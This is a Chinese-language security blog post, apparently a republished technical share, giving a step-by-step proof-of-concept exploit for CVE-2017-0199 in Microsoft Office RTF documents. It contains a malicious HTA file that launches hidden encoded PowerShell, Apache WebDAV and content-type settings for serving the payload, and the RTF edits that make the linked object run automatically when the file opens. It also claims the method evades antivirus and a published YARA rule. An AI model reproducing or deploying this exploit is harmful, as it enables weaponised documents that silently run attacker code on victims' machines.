> 原文链接: https://www.anquanke.com//post/id/85902 


# 【技术分享】CVE-2017-0199：Microsoft Office RTF 漏洞利用 PoC


                                阅读量   
                                **156363**
                            
                        |
                        
                                                                                    



**[![](https://p2.ssl.qhimg.com/t01f53a9228f29b135b.jpg)](https://p2.ssl.qhimg.com/t01f53a9228f29b135b.jpg)**

**0x01 介绍**

自FireFye检测并发布[CVE-2017-0199](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html)以来，我一直在研究这个漏洞，在微软正式发布补丁后，我决定发布这个PoC。我的利用方式可能与其他研究人员的利用方法不同，这个利用方法可能会更轻松一点。

CVE-2017-0199：当用户打开包含嵌入式漏洞的文档时，winword.exe会向远程服务器发出HTTP请求，以检索恶意HTA文件，服务器返回的文件时一个带有嵌入式恶意脚本的假RTF文件，winword.exe通过COM对象查找application/hta的文件处理程序，这会导致Microsoft HTA应用程序（mshta.exe）加载并执行恶意脚本。

<br>

**0x02 技术背景**

我们可以将OLEv2链接包含在现有文档中。 这些对象将反映加载到文档中的源链接中的当前内容。

令人惊奇的是，如果尝试将HTA链接包含为OLEv2对象，那么它将被执行一次（在创建时），但Winword将返回一个错误，如：

[![](https://p0.ssl.qhimg.com/t01fe534d6efb581fa3.png)](https://p0.ssl.qhimg.com/t01fe534d6efb581fa3.png)

在这种情况下的问题是HTA文件不会被持久化（如果你将其链接到文件+创建图标，那么它可能可以做到持久化，但是我们想要它隐藏并自动运行）。

我开始通过思考如何处理不是恶意的OLE对象链接到远程RTF文件…为了实现在“proper”Microsoft Office中的预期方式，我一点点修改在Apache中服务我的文件的内容类型和DAV模块…（这将在下一章讨论）。

从那里开始，我会有一个有效的嵌入对象链接，在每次自动更新后都打开我的文档！

下一步，在HTA中用我的有效载荷修改来源的文档！

在这种情况下，我能够：

 为真正的RTF文件创建一个动态OLEv2对象链接

使用我的有效载荷修改源的RTF

 如果想创建一个直接链接到HTA文档，请绕过所产生的错误

<br>

**0x03 技术细节**

**步骤1**

准备一个HTA文件：（HTA文件是可以运行JScript和VBscript的HTML应用程序）

我们创建一个“ms.hta”文件：



```
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;  
   &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;  
   &lt;head&gt;  
   &lt;meta content="text/html; charset=utf-8" http-equiv="Content-Type" /&gt;  
   &lt;title&gt;Bonjour&lt;/title&gt;  
 &lt;script language="VBScript"&gt;  
  Set owFrClN0giJ = CreateObject("Wscript.Shell")   
  Set v1ymUkaljYF = CreateObject("Scripting.FileSystemObject")  
  If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings("%PSModulePath%") + "..powershell.exe") Then  
   owFrClN0giJ.Run "powershell.exe -nop -w hidden -e ENCODED_B64_SHELL"  
  End If  
 &lt;/script&gt;  
 &lt;hta:application  
     id="oHTA"  
     applicationname="Bonjour"  
     application="yes"  
   &gt;  
   &lt;/hta:application&gt;  
   &lt;/head&gt;  
   &lt;div&gt;   
   &lt;object type="text/html" data="http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender" width="100%" height="100%"&gt;  
   &lt;/object&gt;&lt;/div&gt;    
   &lt;body&gt;  
   &lt;/body&gt;  
   &lt;/html&gt;
```

**步骤2**

使用任意随机内容在Winword中创建一个简单的RTF文档。（在例子中，我使用字符串来作为我的内容）

命名为“ms.rtf”。

**步骤3**

将这2个文件发送到被我们完全控制的网络服务器上。我们假定它将被存储在/var/www/html中。

现在我们必须配置Apache才能将ms.rtf作为一个链接。配置Apache：



```
a2enmod dav
 a2enmod dav_fs
 a2enmod dav_lock
 a2enmod headers
 service apache2 restart
```

以下命令将会：

将“Content-Type application/rtf”添加到/ms中的所有文件中

允许Microsoft Office执行的PROPFIND请求



```
Modify virtualhost and include:
&lt;Directory /var/www/html/ms/&gt; 
 Header set Content-Type "application/rtf" 
 &lt;/Directory&gt; 
 &lt;Directory /&gt; 
 Dav on 
 &lt;/Directory&gt;
service apache2 restart
```

**步骤4**

使用Winword的“ exploit.rtf ” 创建一个简单的RTF文档，这将是我们的exploit！

插入 – &gt;对象

[![](https://p0.ssl.qhimg.com/t014a98158e30058aec.png)](https://p0.ssl.qhimg.com/t014a98158e30058aec.png)

CVE-2017-0199创建OLEv2外部链接

单击确定后，我们将获得只包含随机字符串内容的“ms.rtf”文件。将该文件保存为“ exploit.rtf ”。

[![](https://p0.ssl.qhimg.com/t014e55d2efb3d53363.png)](https://p0.ssl.qhimg.com/t014e55d2efb3d53363.png)

CVE-2017-0199创建Olev2链接对象

在这一步我们可以关闭Winword，并转到下一步改变ms.rtf的内容与HTA有效载荷…

**步骤5**

以下步骤将：

更改自定义HTA有效载荷中包含的ms.rtf

Web服务器将发送“application/hta”的内容类型…这将由Winword客户端解析，它将运行mshta来处理这个内容类型并执行我们的有效载荷



```
cat /var/www/html/ms/ms.hta &gt; /var/www/html/ms.rtf
vi /etc/apache2/sites-enables/000-default 
Change -&gt; application/rtf to application/hta 
like:
&lt;Directory /var/www/html/ms/&gt; 
Header set Content-Type "application/hta" 
&lt;/Directory&gt;
service apache2 restart
```

**步骤6**

在这一步，如果用户打开“exploit.rtf”文件了，他必须要双击链接对象来启动攻击…

如果我们希望在文档开头时自动加载OLE对象，我们必须编辑更改exploit.rtf文件：

[![](https://p1.ssl.qhimg.com/t01742fa6be0b9b91b3.png)](https://p1.ssl.qhimg.com/t01742fa6be0b9b91b3.png)

到

```
objectobjautlinkobjupdatersltpict……………………..
```

在这个步骤中，我们成功的构建了exploit。

Exploitation:一旦用户打开文档，由于服务器提供的application/hta content-type执行ms.hta，OLE对象将通过链接来更新。这样会得到执行代码的结果。

[![](https://p3.ssl.qhimg.com/t01cd012fc4fad592db.png)](https://p3.ssl.qhimg.com/t01cd012fc4fad592db.png)

我们可以不用关心警告了，因为代码已经执行了。

[![](https://p5.ssl.qhimg.com/t015fa8dad01340e9cb.png)](https://p5.ssl.qhimg.com/t015fa8dad01340e9cb.png)

CVE-2017-0199被成功利用了， 执行后发出警告

<br>

**使用当前AV/published YARA规则**

从我的个人测试来看，这种方法似乎没有被AV捕获（Defender已经有CVE-2017-0199的签名），此外，目前发布的yara规则与此漏洞利用率不匹配。



```
rule rtf_objdata_urlmoniker_http `{`
 strings:
 $header = "`{`\rtf1"
 $objdata = "objdata 0105000002000000" nocase
 $urlmoniker = "E0C9EA79F9BACE118C8200AA004BA90B" nocase
 $http = "68007400740070003a002f002f00" nocase
 condition:
 $header at 0 and $objdata and $urlmoniker and $http
 `}`
```

确实，urlmoniker不匹配，这将永远不会触发这个yara规则。

<br>

**0x04 参考**

****

[https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html](https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html) 

[https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/](https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/)  

[https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/](https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/) 
